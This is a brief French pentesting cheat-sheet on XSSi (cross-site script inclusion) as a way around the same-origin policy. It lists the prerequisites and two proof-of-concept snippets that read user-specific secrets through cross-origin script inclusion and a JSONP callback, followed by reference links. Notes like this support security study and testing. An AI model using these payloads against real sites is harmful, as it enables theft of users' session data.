# XSSi

> Tips pour l'exploitation de XSSi
>
> Faille permettant de bypass la protection SOP (évite qu'un attaquant puisse récupérer des informations d'un **autre site** avec les droits de l'utilisateur connecté)
>
> Objectifs : récupérer du contenu dynamique (une page), propre à un utilisateur (et donc, contenant des secrets propres à sa session)



**Prérequis :**

- Pas d'headers CORS : `Authorization, X-API-KEY, X-CSRF-TOKEN, X-whatever`
- Pas d'header `X-Content-Type-Options : nosniff`



**Cible :**

- fichiers `.js` contenant des informations dynamiques :

  ```javascript
  <script src="https://www.vulnerable-domain.tld/script.js"></script>
  <script> alert(JSON.stringify(confidential_keys[0])); </script>
  ```

- fichiers `.json` contenant des informations dynamiques (pour ce type de fichiers, il faut trouver un paramètre **jsonp** de callback) :

  ```javascript
  <script>
        leak = function (leaked) {
  	  alert(JSON.stringify(leaked));
        };  
  </script>
  <script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
  ```



### Ressources

- https://www.scip.ch/en/?labs.20160414
- https://www.sjoerdlangkemper.nl/2019/01/02/jsonp/
- https://www.dailysecurity.fr/xssi-sop-bypass/
- https://www.mbsd.jp/Whitepaper/xssi.pdf
- https://book.hacktricks.xyz/pentesting-web/xssi-cross-site-script-inclusion
- Extension BURP pour détecter du javascript généré dynamiquement : https://github.com/luh2/DetectDynamicJS
